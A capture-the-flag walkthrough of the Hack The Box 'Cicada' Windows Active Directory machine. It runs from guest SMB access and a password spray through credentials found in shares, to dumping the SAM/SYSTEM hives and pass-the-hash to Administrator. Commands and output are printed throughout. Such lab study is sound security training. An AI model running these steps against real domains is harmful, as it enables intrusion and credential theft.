# Cicada

**Platform:** Hack The Box
**Difficulty:** Easy
**Topics:** Active Directory, SMB Enumeration, RID Brute Force, Password Spray, BloodHound, SeBackupPrivilege, SAM Dump, Pass-the-Hash

---

## Overview

Cicada is an easy-rated Windows Active Directory machine that walks through a realistic beginner AD attack chain — from anonymous share access all the way to full domain compromise. No exploits, no CVEs; just methodical enumeration, credential discovery, and privilege abuse.

The machine rewards patience and thoroughness: a default password is hiding in an HR share, a second password is left in a user's AD description field, and a third is hardcoded in a backup script. Once you chain these together, you land on an account with `SeBackupPrivilege` — which lets you read any file on the system, including the Windows credential store.

**Attack Path:**
```
Nmap → SMB guest login → HR share → default password in notice file
→ RID brute force → domain user list → password spray → michael.wrightson
→ BloodHound (no attack paths) → nxc --users → david.orelious password in AD description
→ DEV share → Backup_script.ps1 → emily.oscars credentials
→ Evil-WinRM (user flag) → SeBackupPrivilege → reg save SAM/SYSTEM/SECURITY
→ secretsdump → Administrator NTLM hash → Pass-the-Hash → root flag
```

---

## Setup

Before running any commands, add the machine to `/etc/hosts` so that `cicada.htb` and `CICADA-DC.cicada.htb` resolve to the target IP. Without this, SMB auth with domain accounts, Evil-WinRM, and BloodHound collection will all fail:

```bash
echo '<DC_IP> cicada.htb CICADA-DC.cicada.htb' | sudo tee -a /etc/hosts
```

---

## Enumeration

### Nmap

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
```

Key findings:
- **Domain:** `cicada.htb`
- **Hostname:** `CICADA-DC.cicada.htb`
- **OS:** Windows Server 2022 (Build 20348)
- **Port 5985 open** — WinRM is available, meaning any user in the Remote Management Users group can get a shell
- **LDAP on 389/636/3268/3269** — this is a Domain Controller; the SSL certificate issuer (`CICADA-DC-CA`) tells us an internal Certificate Authority is running on the DC itself

---

### SMB Enumeration — Guest Login

Start with a null session (no credentials at all). The DC allows the connection but refuses to list shares:

```bash
nxc smb cicada.htb -u "" -p "" --shares
```

```
SMB  <DC_IP>  445  CICADA-DC  [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Try the built-in `guest` account instead — it has no password by default:

```bash
nxc smb cicada.htb -u "guest" -p "" --shares
```

```
SMB  <DC_IP>  445  CICADA-DC  [+] cicada.htb\guest:
SMB  <DC_IP>  445  CICADA-DC  Share        Permissions  Remark
SMB  <DC_IP>  445  CICADA-DC  -----        -----------  ------
SMB  <DC_IP>  445  CICADA-DC  ADMIN$                    Remote Admin
SMB  <DC_IP>  445  CICADA-DC  C$                        Default share
SMB  <DC_IP>  445  CICADA-DC  DEV
SMB  <DC_IP>  445  CICADA-DC  HR           READ
SMB  <DC_IP>  445  CICADA-DC  IPC$         READ          Remote IPC
SMB  <DC_IP>  445  CICADA-DC  NETLOGON                  Logon server share
SMB  <DC_IP>  445  CICADA-DC  SYSVOL                    Logon server share
```

Guest has **READ** on the `HR` share. Everything else is locked down — `DEV` has no permissions listed yet.

---

### HR Share — Default Password Discovered

Connect to the HR share and look around:

```bash
smbclient //cicada.htb/HR -U cicada.htb/guest
```

```
smb: \> dir
  Notice from HR.txt    A    1266    Wed Aug 28 13:31:48 2024
```

Download and read the file:

```bash
smb: \> get "Notice from HR.txt"
```

The file is a welcome message to new hires, containing the company's **default password** issued to every new employee:

> Your default password is: `<DEFAULT_PASSWORD>`

This kind of misconfiguration is extremely common — IT sets a standard starting password and relies on users to change it, but some never do.

---

### RID Brute Force — Discovering Domain Users

Before we can spray the password, we need a list of users. RID brute forcing works by calling a Windows API repeatedly with incrementing numeric IDs (RIDs). Every user and group in a Windows domain has one, and the DC will resolve them to names — even for an unauthenticated guest session.

```bash
nxc smb cicada.htb -u "guest" -p "" --rid-brute 10000
```

This walks through RID 0–10000 and maps each hit to a name. The interesting range is 1000+ where custom domain accounts live:

```
1104: CICADA\john.smoulder     (SidTypeUser)
1105: CICADA\sarah.dantelia    (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious    (SidTypeUser)
1601: CICADA\emily.oscars      (SidTypeUser)
```

Save these five usernames to a file (`users.txt`) — we'll use them for the spray.

---

## Initial Access — Password Spray (`michael.wrightson`)

> **Before any spray:** Always check the domain's account lockout policy first — a threshold of even 3 attempts will lock accounts. Many DCs allow guest or null sessions to query it:
> ```bash
> nxc smb cicada.htb -u "guest" -p "" --pass-pol
> ```
> On this machine there is no lockout threshold (confirmed in the AD Enumeration section), so we can spray freely.

Now spray the default password from the HR notice against all five accounts. The `--continue-on-success` flag makes sure NetExec doesn't stop at the first hit:

```bash
nxc smb CICADA-DC.cicada.htb -u users.txt -p '<DEFAULT_PASSWORD>' --continue-on-success
```

```
[-] cicada.htb\john.smoulder:<DEFAULT_PASSWORD>    STATUS_LOGON_FAILURE
[-] cicada.htb\sarah.dantelia:<DEFAULT_PASSWORD>   STATUS_LOGON_FAILURE
[+] cicada.htb\michael.wrightson:<DEFAULT_PASSWORD>
[-] cicada.htb\david.orelious:<DEFAULT_PASSWORD>   STATUS_LOGON_FAILURE
[-] cicada.htb\emily.oscars:<DEFAULT_PASSWORD>     STATUS_LOGON_FAILURE
```

`michael.wrightson` never changed their default password.

Verify his access and check what shares he can reach:

```bash
nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p '<DEFAULT_PASSWORD>' --shares
```

He now has READ on SYSVOL (worth checking for Group Policy Preferences passwords — nothing found here), but still no access to `DEV`. We need to go further.

Test WinRM access:

```bash
nxc winrm cicada.htb -u michael.wrightson -p '<DEFAULT_PASSWORD>'
```

```
[-] cicada.htb\michael.wrightson:<DEFAULT_PASSWORD>
```

`michael.wrightson` is not in the Remote Management Users group — no shell yet.

---

## AD Enumeration

### BloodHound Collection

Use `michael.wrightson`'s credentials to collect BloodHound data from LDAP. This maps out the entire domain — group memberships, ACL rights, and attack paths:

```bash
nxc ldap CICADA-DC.cicada.htb -u michael.wrightson -p '<DEFAULT_PASSWORD>' --bloodhound -c All --dns-server <DC_IP>
```

Load the resulting `.zip` into BloodHound and run the pre-built queries. The graph shows a few outbound object control rights but no direct attack paths for `michael.wrightson`.

![BloodHound — michael.wrightson outbound object control](screenshots/bloodhound-michael-outbound.png)

### ADCS — Ruled Out

The nmap SSL certificate issuer tipped us off to an internal CA. Check for vulnerable certificate templates:

```bash
certipy find -u michael.wrightson -p '<DEFAULT_PASSWORD>' -dc-ip <DC_IP> -text -enabled -vulnerable
```

```
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 0 certificate authorities
[*] Found 0 enabled certificate templates
```

The CA is present but not published in Active Directory — there's no enrollment endpoint, so certificate-based attacks (ESC1, ESC8, etc.) are off the table. The CA exists only to sign the DC's own LDAPS certificate.

### Password Policy Check

We have valid credentials now — let's pull the full policy to confirm we can spray further without risk of account lockouts:

```bash
nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p '<DEFAULT_PASSWORD>' --pass-pol
```

```
Account Lockout Threshold: None
```

No lockout — we can spray freely without risking account lockouts.

---

## Lateral Movement — `david.orelious`

### Password in AD Description Field

Enumerate all domain users and their attributes. The `--users` flag pulls the full user listing, including description fields:

```bash
nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p '<DEFAULT_PASSWORD>' --users
```

Buried in the output:

```
david.orelious   Just in case I forget my password is <REDACTED>
```

`david.orelious` stored their password in their own AD account description — visible to any authenticated domain user. This is a surprisingly common mistake.

### DEV Share Access

Confirm `david.orelious`'s credentials and check share access:

```bash
nxc smb CICADA-DC.cicada.htb -u david.orelious -p '<REDACTED>' --shares
```

```
SMB  <DC_IP>  445  CICADA-DC  [+] cicada.htb\david.orelious:<REDACTED>
SMB  <DC_IP>  445  CICADA-DC  Share        Permissions  Remark
SMB  <DC_IP>  445  CICADA-DC  -----        -----------  ------
SMB  <DC_IP>  445  CICADA-DC  ADMIN$                    Remote Admin
SMB  <DC_IP>  445  CICADA-DC  C$                        Default share
SMB  <DC_IP>  445  CICADA-DC  DEV          READ
SMB  <DC_IP>  445  CICADA-DC  HR           READ
SMB  <DC_IP>  445  CICADA-DC  IPC$         READ          Remote IPC
SMB  <DC_IP>  445  CICADA-DC  NETLOGON     READ          Logon server share
SMB  <DC_IP>  445  CICADA-DC  SYSVOL       READ          Logon server share
```

`david.orelious` has READ on the `DEV` share that was locked to guest.

---

## Credential Discovery — `emily.oscars`

### Credential Discovery in Backup Script

Browse the `DEV` share:

```bash
smbclient //cicada.htb/DEV -U cicada.htb/david.orelious -c 'recurse; ls'
```

```
Backup_script.ps1    A    601    Wed Aug 28 13:28:22 2024
```

Download and read it:

```bash
smbclient //cicada.htb/DEV -U cicada.htb/david.orelious -c 'get Backup_script.ps1 Backup_script.ps1'
```

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "<REDACTED>" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
```

The backup script hardcodes `emily.oscars`'s credentials in plaintext. This is a common developer shortcut that becomes a serious security risk when the script lands somewhere accessible.

### Getting a Shell via Evil-WinRM

Verify the credentials work and check for WinRM access:

```bash
nxc winrm cicada.htb -u emily.oscars -p '<REDACTED>'
```

```
[+] cicada.htb\emily.oscars:<REDACTED> (Pwn3d!)
```

`emily.oscars` is in the Remote Management Users group. Connect:

```bash
evil-winrm -i <DC_IP> -u emily.oscars -p '<REDACTED>'
```

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
```

Grab the user flag from emily's desktop before moving on:

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> type C:\Users\emily.oscars.CICADA\Desktop\user.txt
```

---

## Full Domain Compromise — SeBackupPrivilege

### Checking Privileges

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
```

```
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`SeBackupPrivilege` is enabled — and this is significant. Windows grants this privilege so that backup software can read any file on the system regardless of permissions. We can exploit that: the `SAM` and `SYSTEM` registry hives contain local account password hashes, and normally only SYSTEM can read them. With `SeBackupPrivilege`, we bypass that restriction entirely.

BloodHound confirms it: `emily.oscars` is a member of the **Backup Operators** built-in group, which is what grants these privileges.

![BloodHound — emily.oscars member of Backup Operators](screenshots/bloodhound-emily-backupoperators.png)

### Dumping the SAM and SYSTEM Hives

Save both registry hives to disk from within the Evil-WinRM session. SAM holds local account hashes; SYSTEM contains the boot key needed to decrypt them:

```bash
*Evil-WinRM* PS C:\windows\temp> reg save HKLM\SAM C:\Windows\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\windows\temp> reg save HKLM\SYSTEM C:\Windows\Temp\system
The operation completed successfully.
```

Download both files to your attacking machine using Evil-WinRM's built-in download function:

```bash
*Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\sam
*Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\system
```

### Extracting Hashes with Secretsdump

Pass both files to `secretsdump.py` for offline hash extraction:

```bash
secretsdump.py -sam sam -system system LOCAL
```

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We now have the Administrator's NT hash.

### Pass-the-Hash — Administrator Access

There's no need to crack the hash. We can authenticate directly with it using Evil-WinRM's `-H` flag (Pass-the-Hash):

```bash
evil-winrm -i <DC_IP> -u Administrator -H '<NT_HASH>'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```

Full domain compromise. The root flag is on the Administrator's desktop.

> **Alternative — NetExec `backup_operator` module:** If you have a user with SeBackupPrivilege or Backup Operators membership but prefer not to drop a shell first, NetExec can automate the hive extraction in one step:
> ```bash
> nxc smb <DC_IP> -u emily.oscars -p '<REDACTED>' -M backup_operator
> ```
> This replaces the manual `reg save` + download steps and outputs the SAM/SYSTEM hashes directly — you still pass-the-hash the result the same way. It requires the same privilege (Backup Operators group membership), so it will not work with lower-privileged accounts.

---

## Summary

| Step | Finding / Technique | Tool |
|------|---------------------|------|
| Guest SMB access | `guest` account enabled, HR share readable | NetExec |
| Default password | Plaintext password in HR onboarding notice | smbclient |
| User enumeration | RID brute force reveals 5 domain users | NetExec |
| Initial access | Password spray — `michael.wrightson` never changed default | NetExec |
| AD enumeration | BloodHound collection, ADCS ruled out, no lockout policy | NetExec, Certipy |
| Lateral movement | Password stored in `david.orelious` AD description field | NetExec |
| Credential discovery | `emily.oscars` password hardcoded in `Backup_script.ps1` | smbclient |
| Shell + user flag | `emily.oscars` in Remote Management Users → WinRM shell → user.txt | Evil-WinRM |
| Privilege escalation | Backup Operators → SeBackupPrivilege → reg save SAM/SYSTEM | reg, secretsdump |
| Full compromise | Administrator NTLM hash → Pass-the-Hash | Evil-WinRM |
